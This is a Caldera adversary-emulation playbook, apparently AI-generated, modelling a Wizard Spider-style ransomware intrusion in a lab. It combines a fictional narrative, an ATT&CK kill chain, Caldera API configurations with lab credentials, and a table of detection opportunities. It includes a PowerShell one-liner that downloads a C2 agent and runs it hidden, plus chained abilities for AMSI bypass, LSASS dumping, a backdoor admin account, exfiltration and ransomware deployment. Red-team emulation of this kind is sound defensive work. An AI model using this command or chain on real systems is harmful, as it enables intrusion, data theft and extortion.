---
type: Adversary Operation
title: "Operation Crimson Tide"
description: Financially-motivated ransomware campaign modelled on Wizard Spider — valid credential entry on a privileged host, rapid defense disabling, domain-wide lateral movement, data staging, and ransomware deployment.
tags:
  - operation
  - ransomware
  - wizard-spider
  - financially-motivated
  - impact
  - windows
generated:
  by: claude-sonnet-4-6
  at: '2026-07-30T17:00:00Z'
status: stable
---

# Operation Crimson Tide

## Story

An initial access broker sold a credential dump from a corporate VPN breach to a ransomware affiliate. The dump contained the username and password for **lab-user** on **windows-the-boss** — a higher-privilege workstation whose owner is a department head with access to sensitive file shares and a domain admin group membership through a standing delegation.

The ransomware operator logs in via RDP. Within the first 15 minutes, they disable Windows Defender and the host firewall, bypass AMSI, and begin rapid network discovery. They find the domain controller immediately — same domain, Paloalto1! password on `administrator`. They copy their tooling via SMB, land on **windows-client-11** and **windows-dc** simultaneously, create a backdoor domain admin account in case they're caught and need re-entry, stage sensitive files for double-extortion, then detonate ransomware across all reachable hosts.

**The story arc:** Fast and loud. The attacker knows they have a short window between access and detection. Speed over stealth. Every minute counts.

---

## Narrative

The email from the broker was two sentences long.

*Fresh dump. Gov contractor VPN. One DA-adjacent account, confirmed active. $4,200 USD. First come.*

The affiliate bought it within the hour. By the time they sat down at their desk in Bucharest it was already 11 PM. They didn't care. Ransomware doesn't keep office hours.

---

The credential was for a user called *lab-user* on a machine called *windows-the-boss*. The name alone was promising. They tried RDP. It connected on the first attempt. The desktop loaded — a Windows wallpaper, a handful of shortcuts, an Outlook window mid-compose.

They minimized Outlook without reading it. They had work to do.

The first fifteen minutes were mechanical. AMSI down. Firewall rules opened for SMB and RDP. PowerShell execution policy gone. These weren't choices — they were a checklist, practiced hundreds of times, executed from muscle memory. The affiliate had done this so many times they no longer thought about the individual steps. They just moved.

Adfind ran. The domain controller appeared immediately — same domain, one hop away. They tried the administrator password from the dump. *Paloalto1!*

It worked.

They laughed out loud at that. Alone in a dark apartment in Bucharest, they actually laughed.

---

The spread took eleven minutes.

SMB to the workstation. PsExec to the domain controller. Three machines, three implants, total coverage of the environment. They created a backdoor domain admin account — *svc_helpdesk_02* — for re-entry in case something went wrong before they finished. Old habit. Good habit.

Then they went looking for data worth stealing.

The file shares were disorganized the way all corporate file shares are disorganized — years of accumulated folders with names like *OLD_ARCHIVE_2021* and *FINAL_FINAL_v3*. But buried in there was a folder called *CONTRACTS_ACTIVE* and another called *HR_CONFIDENTIAL*. They staged everything automatically. Compressed it. Password-protected the archive.

The upload took four minutes. The data was gone before anyone in the building had finished their morning coffee.

Now came the part they'd been building toward.

---

System Restore: disabled. Windows Recovery Environment: disabled. Volume Shadow Copies: gone. Every road back, every lifeline, every "undo" — cut.

The ransomware binary dropped silently onto all three machines simultaneously. It didn't announce itself. It just began — methodically, alphabetically — working through every file it could reach. Documents, spreadsheets, databases, backups. Each one encrypted with a key that existed only on a server in Minsk. Each one renamed with an extension that made its new nature unmistakable.

The ransom note appeared on every desktop at the same moment.

*YOUR FILES HAVE BEEN ENCRYPTED. DO NOT ATTEMPT RECOVERY. YOU HAVE 72 HOURS.*

Then the passwords changed. Every account on every machine, locked out in sequence. The domain controller last — the final door, slammed shut.

From RDP connection to full domain encryption: forty-three minutes.

---

The affiliate closed their laptop and ordered food. They would check the payment portal in the morning. They usually heard back within twenty-four hours — the panic set in fast once IT realized the backups were gone too.

In the office, someone was about to arrive at their desk and find a black screen with white text where their work used to be.

The tide had come in. There was nothing left dry.

---

## ATT&CK Kill Chain

| # | Phase | Tactic | Technique | Description |
|---|---|---|---|---|
| 1 | Entry | Initial Access | T1078 — Valid Accounts | Operator RDPs with stolen lab-user credentials |
| 2 | Arm | Execution | T1059.001 — PowerShell | Drop and execute tooling via encoded PS |
| 3 | Blind Defenders | Defense Impairment | T1685 — AMSI Bypass | Disable AMSI before running offensive scripts |
| 4 | Blind Defenders | Defense Impairment | T1686 — Allow Firewall Rules | Open SMB + RDP on Windows Firewall |
| 5 | Blind Defenders | Defense Impairment | T1562.001 — Bypass ExecutionPolicy | Disable PS execution policy restrictions |
| 6 | Map the Domain | Discovery | T1018 — Remote Systems | Adfind: enumerate AD computers and DCs |
| 7 | Map the Domain | Discovery | T1016 — Network Config | Adfind: enumerate subnets |
| 8 | Map the Domain | Discovery | T1049 — Network Connections | Active connections and open ports |
| 9 | Map the Domain | Discovery | T1135 — Network Shares | Find accessible file shares |
| 10 | Grab Keys | Credential Access | T1003.005 — Cached Creds | Cmdkey cached domain credentials |
| 11 | Grab Keys | Credential Access | T1552.001 — Unattend.xml | Search for hardcoded credentials in config files |
| 12 | Grab Keys | Credential Access | T1555.003 — Browser Creds | Chrome/Edge/Firefox saved passwords |
| 13 | Grab Keys | Credential Access | T1003.001 — LSASS Dump | Dump LSASS for domain credential material |
| 14 | Spread | Lateral Movement | T1021.002 — SMB | Copy Sandcat to windows-client-11 via ADMIN$ share |
| 15 | Spread | Lateral Movement | T1570 — Lateral Tool Transfer | PsExec Sandcat to windows-dc (administrator/Paloalto1!) |
| 16 | Plant Flag | Persistence | T1136.002 — Domain Admin Account | Create hidden DA backdoor for re-entry |
| 17 | Plant Flag | Persistence | T1053.005 — Scheduled Task | Register persistence on all hosts |
| 18 | Stage Loot | Collection | T1005 — Local Data | Collect sensitive files from all hosts |
| 19 | Stage Loot | Collection | T1560.001 — Archive | Compress and password-protect staged data |
| 20 | Double Extortion | Exfiltration | T1041 — C2 Channel | Exfil archive before encryption |
| 21 | Kill Recovery | Impact | T1490 — Inhibit Recovery | Disable System Restore via registry |
| 22 | Kill Recovery | Impact | T1490 — BCDEdit | Disable Windows Recovery Environment |
| 23 | Detonate | Impact | T1486 — Encrypt Data | Drop Akira-style ransomware with ransom note |
| 24 | Lock Out | Impact | T1531 — Account Access | Change user passwords across hosts |

---

## Caldera Configuration

### Custom Adversary (Create via API)

This operation requires a custom adversary combining Wizard Spider abilities with aggressive defense impairment and impact abilities.

```json
POST /api/v2/adversaries
{
  "name": "Operation Crimson Tide - Ransomware",
  "description": "Fast-moving ransomware campaign: disable defenses, spread via SMB, stage for double extortion, encrypt domain-wide. Modelled on Wizard Spider / LockBit TTPs.",
  "atomic_ordering": [
    "c0177717b47f2cd07949186523fa3c6b",
    "34952e2eefd3066c5f574744e1734ca6",
    "280003641a5cddf916c4f2bf605a71d3",
    "3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e",
    "c6f643adfd3ed9cf2806bfcb297e0eee",
    "ab4dc7789a2374e8fc298302e215ab52",
    "706ae72d8994c4570a023189788a567e",
    "ba0b398d-91b8-490a-bed2-f959afa8e1aa",
    "bb0df721f4a4defa743efe9e61837c44",
    "780cde60c956ccbff24c43ff7b7e70ea",
    "b267badd4e6f3601450582cb07d9f333",
    "473e5707-5786-4f53-934f-22175c1059b0",
    "65048ec1-f7ca-49d3-9410-10813e472b30",
    "620b674a-7655-436c-b645-bc3e8ea51abd",
    "c6bf167afe0b85a1e88127fc0d093e4d",
    "381ee532-e000-4c1e-9073-903cb1ed1778",
    "fc231955-774f-442c-ac0e-e74dfda50c5c",
    "160a1e0f-0f9b-49bb-a0fe-7e362b51737f",
    "72784d12700b219ec134aa42cec5603e",
    "c8f329d2847ede593b6cb4a1ec6120fb",
    "2bfd70f3-d5ce-4a11-a730-62b9e4015ac3",
    "73aaa846b42d1d97175d21e914725f31",
    "f7e779369b3f0cff24152d7dd94eca98"
  ]
}
```

### Ability Manifest

| Order | Ability ID | Technique | Name |
|---|---|---|---|
| 1 | `c0177717b47f2cd07949186523fa3c6b` | T1059.001 | PowerShell -Command execution |
| 2 | `34952e2eefd3066c5f574744e1734ca6` | T1685 | AMSI Bypass - InitFailed |
| 3 | `280003641a5cddf916c4f2bf605a71d3` | T1686 | Allow SMB + RDP on Defender Firewall |
| 4 | `3864fd22-5c63-41c9-bdbc-a66b5ffa3f5e` | T1562.001 | Bypass PowerShell ExecutionPolicy |
| 5 | `c6f643adfd3ed9cf2806bfcb297e0eee` | T1018 | Adfind — AD Computer Objects |
| 6 | `ab4dc7789a2374e8fc298302e215ab52` | T1018 | Adfind — AD Domain Controller Objects |
| 7 | `706ae72d8994c4570a023189788a567e` | T1016 | Adfind — AD Subnet Objects |
| 8 | `ba0b398d-91b8-490a-bed2-f959afa8e1aa` | T1049 | Network Connections Discovery |
| 9 | `bb0df721f4a4defa743efe9e61837c44` | T1003.005 | Cached Credential Dump via Cmdkey |
| 10 | `780cde60c956ccbff24c43ff7b7e70ea` | T1552.001 | Access unattend.xml |
| 11 | `b267badd4e6f3601450582cb07d9f333` | T1555.003 | BrowserStealer |
| 12 | `473e5707-5786-4f53-934f-22175c1059b0` | T1003.001 | UAC Bypass + LSASS Dump |
| 13 | `65048ec1-f7ca-49d3-9410-10813e472b30` | T1021.002 | Copy Sandcat via SMB |
| 14 | `620b674a-7655-436c-b645-bc3e8ea51abd` | T1570 | Copy Sandcat via PsExec |
| 15 | `c6bf167afe0b85a1e88127fc0d093e4d` | T1136.002 | Create Windows domain admin user |
| 16 | `381ee532-e000-4c1e-9073-903cb1ed1778` | T1053.005 | Agent Persistence (Scheduled Task) |
| 17 | `fc231955-774f-442c-ac0e-e74dfda50c5c` | T1005 | Collect Files & Compress |
| 18 | `160a1e0f-0f9b-49bb-a0fe-7e362b51737f` | T1560.001 | Archive Collected Data |
| 19 | `72784d12700b219ec134aa42cec5603e` | T1041 | C2 Data Exfiltration |
| 20 | `c8f329d2847ede593b6cb4a1ec6120fb` | T1490 | Disable System Restore (Registry) |
| 21 | `2bfd70f3-d5ce-4a11-a730-62b9e4015ac3` | T1490 | Disable Windows Recovery (BCDEdit) |
| 22 | `73aaa846b42d1d97175d21e914725f31` | T1486 | Akira Ransomware — drop files + ransom note |
| 23 | `f7e779369b3f0cff24152d7dd94eca98` | T1531 | Change User Password |

### Fact Source (Create Custom)
```json
POST /api/v2/sources
{
  "name": "Crimson Tide - Lab Targets",
  "facts": [
    {"trait": "remote.host.ip", "value": "192.168.3.32", "score": 1},
    {"trait": "remote.host.ip", "value": "192.168.1.31", "score": 1},
    {"trait": "domain.user.name", "value": "lab-user", "score": 1},
    {"trait": "domain.user.password", "value": "Paloalto1!", "score": 1},
    {"trait": "domain.user.name", "value": "administrator", "score": 1},
    {"trait": "domain.user.password", "value": "Paloalto1!", "score": 1}
  ]
}
```

### Operation Launch JSON
```json
POST /api/v2/operations
{
  "name": "Operation Crimson Tide",
  "adversary": {"adversary_id": "a17c9651-4ebb-4883-b67b-d5854eb512c1"},
  "group": "red",
  "planner": {"id": "788107d5-dc1e-4204-9269-38df0186d3e7"},
  "source": {"id": "a1b2c3d4-0002-0002-0002-000000000002"},
  "obfuscator": "plain-text",
  "jitter": "1/3",
  "autonomous": 1,
  "auto_close": true,
  "visibility": 51
}
```

**Planner: batch** — all applicable abilities run simultaneously each phase. This matches the attacker's goal: speed. Jitter is minimal (1–3s) for the same reason.

### Agent Deployment (Entry Point)
Deploy on **windows-the-boss (192.168.3.31)** as `lab-user / Paloalto1!`:
```powershell
$url="http://192.168.8.121:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go-windows");$data=$wc.DownloadData($url);$name=$wc.ResponseHeaders["Content-Disposition"].Split("=")[1];[io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data);Start-Process -FilePath "C:\Users\Public\$name.exe" -ArgumentList "-server http://192.168.8.121:8888 -group red" -WindowStyle Hidden
```

---

## Detection Opportunities

| Phase | What a defender would see |
|---|---|
| Entry | Interactive RDP logon with domain credentials from external IP |
| AMSI bypass | AMSI provider key deletion or `amsiInitFailed` reflection |
| Firewall change | `netsh advfirewall` or Group Policy change event (4657) |
| Discovery | Adfind.exe process, bulk LDAP queries, net share commands |
| Cred dump | LSASS memory access (event 10 Sysmon) from non-privileged process |
| Lateral (SMB) | `ADMIN$` write + service creation on target (event 7045) |
| Lateral (PsExec) | PSEXESVC service creation event |
| Backdoor account | New AD user creation (event 4720) with immediate group add (4728) |
| Recovery disable | BCDEdit.exe with `recoveryenabled no`, or VSS deletion |
| Ransomware | Mass file rename with unknown extension, ransom note creation |
| Password change | Bulk account password changes (event 4723/4724) |
